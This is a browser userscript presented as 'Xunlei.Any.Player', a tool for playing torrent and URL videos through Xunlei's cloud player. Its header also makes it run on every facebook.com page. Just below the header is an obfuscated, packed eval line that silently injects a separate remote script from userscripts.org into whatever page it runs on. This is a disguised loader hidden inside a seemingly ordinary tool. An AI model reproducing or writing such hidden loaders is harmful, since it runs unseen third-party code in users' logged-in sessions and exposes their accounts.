// ==UserScript==
// @name           Xunlei.Any.Player Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace      Xunlei.Any.Player
// @description    Xunlei.Any.Player, should be working on xlpan.com and can play any url as you wish.
// @match          http://xlpan.com/*
// @match          http://f.xunlei.com/*
// @updateURL      https://userscripts.org/scripts/source/138814.meta.js
// @downloadURL    https://userscripts.org/scripts/source/138814.user.js
// @version        0.45
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))
function proxy(fn) {
	var script = document.createElement('script');
	script.textContent = '(' + fn.toString() + ')(window);';
	document.body.appendChild(script);
}
function main(Global){
	var CONSTANTS = {
		tips: '<div class="tips_container"><div class="close">X</div><form autocomplete="off" class="url_form"><input type="text" placeholder="\u64ad\u653eURL, \u9700\u8981 \u6ce8\u518c \u6216 \u767b\u9646" name="url" /><input type="submit" value="\u64ad\u653e" /></form><select class="record"></select>&emsp;<a href="#" class="record_clear">\u6e05\u7a7a</a><br />Xunlei.Any.Player \u5DF2\u542F\u7528&emsp;<a href="http://opengg.me/821/xunlei-any-player/" style="color:blue" target="_blank">\u53CD\u9988</a></div>',
		css: '.tips_container{position:fixed;bottom:2em;right:2em;color:green;opacity:0.4;background:#fff;padding:10px;z-index:99999}.tips_container:hover{opacity:0.9}.tips_container .close{position:absolute;top:0;right:0;color:red;cursor:pointer}.tips_container select, .tips_container select option{max-width:18em}',
		playerjs: 'http://caiji.f.xunlei.com/fileConsume/v21/min2js/player.js',
		title: 'Xunlei.Any.Player - OpenGG'
	};
	var UTILS = {
		addCss: function(str){
			var style = document.createElement('style');
			style.textContent = str;
			document.head.appendChild(style);
		},
		getScript: function (src) {
			var script = document.createElement('script');
			script.src = src;
			document.body.appendChild(script);
		},
		addDom: function(html, callback){
			var div = document.createElement('div');
			div.innerHTML = html;
			callback.call(div,div);
			document.body.appendChild(div);
		},
		validate: function(url){
			var magnetPattern = /magnet:\?xt=urn:btih:([a-zA-Z0-9]+)/;
			if(magnetPattern.test(url)){
				return url.match(magnetPattern)[0];
			}
			return url;
		},
		getCookie: function(ae) {
			return (document.cookie.match(new RegExp("(^" + ae + "| " + ae + ")=([^;]*)")) == null) ? "" : RegExp.$2
		},
		proxy: function(fn){
			var script = document.createElement('script');
			script.textContent = '(' + fn.toString() + ')(window);';
			document.body.appendChild(script);
		},
		isArray: function(o){
			return Object.prototype.toString.call(o).indexOf('Array')!==-1;
		}
	};
	var STORE;
	(function(){
		function empty(){}
		var isStorage = true;
		if(!Global.localStorage){
			isStorage = false;
		}else{
			try{
				var key = String(Math.random());
				localStorage.setItem(key,'test');
				if(localStorage.getItem(key)!=='test'){
					throw 'not equal';
				}
				localStorage.removeItem(key);
			}catch(e){
				isStorage=false;
			}
		}
		STORE = {
			getItem: isStorage?function(key){
				var item;
				try{
					item = JSON.parse(localStorage.getItem(key));
				}catch(e){
					return undefined;
				}
				return item;
			}:empty,
			setItem: isStorage?function(key, value){
				return localStorage.setItem(key, JSON.stringify(value));
			}:empty,
			removeItem: isStorage?function(key){
				return localStorage.removeItem(key);
			}:empty,
			pushArr: isStorage?function(key, value){
				var arr = this.getItem(key);
				if(!UTILS.isArray(arr)){
					arr = [];
				}
				arr.push(value);
				return this.setItem(key, arr);
			}:empty,
		};
	})();
	(function (c) {
		function h(a, e) {
			return a << e | a >>> 32 - e
		}
		function m(a) {
			var e = "",
				c, g;
			for (c = 7; 0 <= c; c--) g = a >>> 4 * c & 15, e += g.toString(16);
			return e
		}
		c.SHA1 = function (a, e) {
			var c, g, i = Array(80),
				l = 1732584193,
				q = 4023233417,
				C = 2562383102,
				z = 271733878,
				v = 3285377520,
				f, p, r, s, x, A, w = [];
			for (g = 0; g < e - 3; g += 4) c = a[g] << 24 | a[g + 1] << 16 | a[g + 2] << 8 | a[g + 3], w.push(c);
			switch (e % 4) {
			case 0:
				g = 2147483648;
				break;
			case 1:
				g = a[e - 1] << 24 | 8388608;
				break;
			case 2:
				g = a[e - 2] << 24 | a[e - 1] << 16 | 32768;
				break;
			case 3:
				g = a[e - 3] << 24 | a[e - 2] << 16 | a[e - 1] << 8 | 128
			}
			for (w.push(g); 14 != w.length % 16;) w.push(0);
			w.push(e >>> 29);
			w.push(e << 3 & 4294967295);
			for (c = 0; c < w.length; c += 16) {
				for (g = 0; 16 > g; g++) i[g] = w[c + g];
				for (g = 16; 79 >= g; g++) i[g] = h(i[g - 3] ^ i[g - 8] ^ i[g - 14] ^ i[g - 16], 1);
				f = l;
				p = q;
				r = C;
				s = z;
				x = v;
				for (g = 0; 19 >= g; g++) A = h(f, 5) + (p & r | ~p & s) + x + i[g] + 1518500249 & 4294967295, x = s, s = r, r = h(p, 30), p = f, f = A;
				for (g = 20; 39 >= g; g++) A = h(f, 5) + (p ^ r ^ s) + x + i[g] + 1859775393 & 4294967295, x = s, s = r, r = h(p, 30), p = f, f = A;
				for (g = 40; 59 >= g; g++) A = h(f, 5) + (p & r | p & s | r & s) + x + i[g] + 2400959708 & 4294967295, x = s, s = r, r = h(p, 30), p = f, f = A;
				for (g = 60; 79 >= g; g++) A = h(f, 5) + (p ^ r ^ s) + x + i[g] + 3395469782 & 4294967295, x = s, s = r, r = h(p, 30), p = f, f = A;
				l = l + f & 4294967295;
				q = q + p & 4294967295;
				C = C + r & 4294967295;
				z = z + s & 4294967295;
				v = v + x & 4294967295
			}
			A = m(l) + m(q) + m(C) + m(z) + m(v);
			return A.toUpperCase()
		}
	})(UTILS);
	(function(parent, Global){
		function getFiles(d, h) {
			var p = k = '', i = j = 0, m = [];
			var l = 0;
			for ( j = d.length; i < j; i++ ) {
				if ( d[i] === 58 ) {
					p = String.fromCharCode(d[++i], d[++i], d[++i], d[++i], d[++i]);
					//如果p等于piece，结束循环
					if ( p === 'piece' )
						break;
					//如果p不等于pathl，结束本次循环
					else if ( p !== 'pathl' )
						continue;
					//迭代得到文件名
					p = (function itera(i) {
						for ( p = k = ''; d[i] !== 58; i++ )
							k += String.fromCharCode(d[i]);
						for ( k = parseInt(k); k > 0; k-- )
							p += '%' + radix(d[++i],10,16);
						try {
							p = decodeURIComponent(p)
						} catch(e) {
							p = unescape(p)
						}
						return d[++i] === 101 ? p : itera(i);
					})(++i);
					//文件名加入数组
					m.push({name:p,id:l++});
				}
			}
			//判断文件是否是媒体文件，并返回文件列表
			var files = [];
			for ( i = 0, j = m.length; i < j; i++ ) {
				if ( /\.(3gp|asf|avi|dat|flv|f4v|m4v|mkv|mov|mp4|mpeg|mpg|mts|ogv|rm|rmvb|ts|vob|webm|wmv)$/i.test(m[i].name) ) {
					files.push({name:m[i].name,id:m[i].id});
				}
			}
			return files;
		}

		function getLength(d, m, i, j, k) {
			var p = '', l = n = m.length - 1, o = m.substr(0, 1);
			if ( k === -1 )
				var getLenTest = function() { return i > j };
			else
				var getLenTest = function() { return i < j };
			for ( ; getLenTest(); i += k ) {
				p = String.fromCharCode(d[i]);
				if ( p === o ) {
					for ( ; n > 0; n-- )
						p += String.fromCharCode(d[++i]);
					if ( p === m )
						return i;
					else if ( k === -1 )
						i -= l;
					n = l;
				}
			}
			return false;
		}
		//进制转换
		function radix(o, before, after) {
			return parseInt(o, before).toString(after);
		};
		function readFile(file, o_start, o_stop, callback) {
			var reader = new FileReader();
			var start = o_start || 0;
			var stop = o_stop || file.size - 1;
			//截取文件开始/结束
			if ( file.slice ){
				var blob = file.slice(start, stop + 1);
			} else {
				throw 'Not supported by you browser.';
				return;
			}
			if ( o_start ) {
				//第二次读取完文件
				reader.onloadend = function(event) {
					if ( event.target.readyState == FileReader.DONE ) {
						var uint8Array = new Uint8Array(event.target.result);
						//计算出SHA1
						var hash = parent.SHA1(uint8Array, uint8Array.length);
						//获取种子中媒体文件列表
						var files = getFiles(uint8Array, hash);
						//区别多文件种子\单文件种子转换的链接
						var links = [];
						for(var i=0;i<files.length;++i){
							links.push({name:files[i].name,link:'bt://'+hash+'/'+files[i].id});
						}
						callback(links);
					}
				}
			} else if ( file ) {
				//第一次读取完文件
				reader.onloadend = function(event) {
					if ( event.target.readyState == FileReader.DONE ) {
						var uint8Array = new Uint8Array(event.target.result);
						var leng = uint8Array.length;
						//查找4:info位置，如果有就是种子文件
						var start = getLength(uint8Array, '4:info', 0, leng, 1);
						if ( !start ) {
							throw 'Not torrent.';
							return;
						}
						//查找5:nodes位置，如果没有，那么位置等于结尾长度减1
						var stop = getLength(uint8Array, '5:nodes', leng, -1, -1);
						stop = stop ? stop - 7 : leng - 2;
						//读取文件4:info开始/5:nodes结束位置
						readFile(file, start + 1, stop, callback);
					}
				}
			}
			reader.readAsArrayBuffer(blob);
		}
		function readTorrent(file, callback){
			file.slice = file.slice||file.mozSlice||file.webkitSlice;
			if(!(Global.File && Global.FileReader && Global.FileList && Global.Blob && file.slice)){
				throw 'Not supported by browser.';
			}
			readFile(file,0,0,callback);
		}
		parent.readTorrent = readTorrent;
	})(UTILS, typeof Global!=='undefined'?Global:this);
	(function(Global){
	    var cache = {};
	    Global.PubSub = Global.PubSub||{
	        on: function(e,fn){
	            if(!cache[e]){
	                cache[e]=[];
	            }
	            cache[e].push(fn);
	            return fn;
	        },
	        off: function(e,fn){
	            if(!cache[e]){
	                return;
	            }
	            var fns = cache[e];
	            if(!fn){
	                fns.length=0;
	            }
	            for(var i=0;i<fns .length;++i){
	                if(fns[i]===fn){
	                    fns.splice(i,1);
	                }
	            }
	        },
	        trigger: function(e,data){
	            if(!cache[e]){
	                return;
	            }
	            var fns = cache[e];
	            for(var i=0;i<fns.length;++i){
	                fns[i](e,data);
	            }
	        }
	    };
	})(typeof Global!=='undefined'?Global:this);
	function play(e ,opts){
		opts = opts||{};
		var XL_CLOUD_FX_INSTANCE = Global.XL_CLOUD_FX_INSTANCE;
		var url = UTILS.validate(opts.url);
		var title = opts.title;
		if(!url){
			alert('Invalid url');
			return;
		}
		if(title){
			document.title = [title,CONSTANTS.title].join(' - ');
		}
		var setAttribute = Global.SWFObject&&Global.SWFObject.prototype&&Global.SWFObject.prototype.setAttribute;
		if(setAttribute&&setAttribute.toString().indexOf('arguments')===-1){
			Global.SWFObject.prototype.setAttribute = function(){
				if(arguments.length>1&&arguments[0]==='swf'){
					var pieces = arguments[1].split('?');
					if(pieces.length>2){
						pieces.length = 2;
					}
					var url = pieces.join('?');
					return setAttribute.call(this, 'swf', url);
				}else{
					return setAttribute.apply(this, arguments);
				}
			};
		}
		if(XL_CLOUD_FX_INSTANCE){
			XL_CLOUD_FX_INSTANCE.user.u = UTILS.getCookie("userid");
			XL_CLOUD_FX_INSTANCE.user.v = 1;
			XL_CLOUD_FX_INSTANCE.user.s = UTILS.getCookie("sessionid");
			XL_CLOUD_FX_INSTANCE.isXlpan = true;
			XL_CLOUD_FX_INSTANCE.query(encodeURIComponent(url));
			return;
		}
		var XL_CLOUD_VOD_PLAYER = document.querySelector('#XL_CLOUD_VOD_PLAYER');
		if(!XL_CLOUD_VOD_PLAYER){
			var container = document.querySelector('#interestContent') || document.querySelector('#wrap') || document.body;
			var html = '<div from="xlpan_web" style="height: 457px; width: 680px; background-color: rgb(0, 0, 0); overflow: hidden;" id="XL_CLOUD_VOD_PLAYER" name="XL_CLOUD_VOD_PLAYER"><a enable_kkva="true" autoplay="true" href="{url}" style="display:none;" onclick="return false;" onsuccess="successBack" onfail="failBack"></a></div>'.replace('{url}',url);
			container.innerHTML = html;
			UTILS.proxy(function(Global){
				Global.parseConfigBaseUrl = "http://caiji.f.xunlei.com";
				Global.parseConfigVer = 'v21';
				Global.parseConfigJs = 'min2js';
				Global.rarConfigUrl = {
					version:parseConfigVer,
					BaseUrl:parseConfigBaseUrl + "/fileConsume/" + parseConfigVer + "/",
					imgBaseUrl:parseConfigBaseUrl + "/fileConsume/" + parseConfigVer + "/images/",
					cssBaseUrl:parseConfigBaseUrl + "/fileConsume/" + parseConfigVer + "/css/",
					swfBaseUrl:parseConfigBaseUrl + "/fileConsume/" + parseConfigVer + "/swf/",
					jsMinBaseUrl:parseConfigBaseUrl + "/fileConsume/" + parseConfigVer + "/minjs/",
					jsBaseUrl:parseConfigBaseUrl + "/fileConsume/" + parseConfigVer + "/" + parseConfigJs + "/",
					editBaseUrl:parseConfigBaseUrl + "/fileConsume/" + parseConfigVer + "/" + parseConfigJs + "/edit/"
				};
				Global.DEBUG=false;
				Global.Debug={
					trace:function(){}
				};
			});
			UTILS.getScript(CONSTANTS.playerjs);
		}
	}
	PubSub.on('video:play', play);
	function push(e, records){
		for(var i=0;i<records.length;++i){
			var record = records[i];
			STORE.pushArr('record',{name:record.name||'No name', link: record.link});
		}
		PubSub.trigger('record:load');
	}
	PubSub.on('record:push', push);
	UTILS.addCss(CONSTANTS.css);
	UTILS.addDom(CONSTANTS.tips, function(){
		function cancel(e){
			e.stopPropagation();
			e.preventDefault();
			return false;
		}
		var that = this;
		that.addEventListener('dragenter', cancel, false);
		that.addEventListener('dragover', cancel, false);
		that.addEventListener('drop', function(e){
			UTILS.readTorrent(e.dataTransfer ? e.dataTransfer.files[0] : e.target.files[0], function (files) {
				PubSub.trigger('record:push', files);
				files.length>0&&PubSub.trigger('video:play',{url:files[0].link});
			});
			return cancel(e);
		}, false);
		that.querySelector('.close').addEventListener('click',function(){
			that.parentNode.removeChild(that);
		},false);
		that.querySelector('.url_form').addEventListener('submit',function(e){
			e.preventDefault();
			var url = this.querySelector('input[name="url"]').value;
			PubSub.trigger('video:play', {url: url});
			PubSub.trigger('record:push', [{link:url}]);
			return false;
		},false);
		var select = that.querySelector('.record');
		select.addEventListener('change',function(e){
			var select = e.target;
			var index = select.selectedIndex;
			var option = select.options[index];
			if(option.value){
				PubSub.trigger('video:play', {title: option.textContent, url: option.value});
			}
		},false);
		function load(){
			var records = STORE.getItem('record');
			if(!records){
				records=[];
			}
			var options = ['<option value="">Play records</option>'];
			for(var i=0;i<records.length;++i){
				var item = records[i];
				options.push('<option value="'+item.link+'">'+item.name+'</option>');
			}
			select.innerHTML = options.join('');
		}
		that.querySelector('.record_clear').addEventListener('click',function(e){
			e.preventDefault;
			STORE.removeItem('record');
			PubSub.trigger('record:load');
			return false;
		});
		PubSub.on('record:load', load);
		PubSub.trigger('record:load');
	});
}
proxy(main);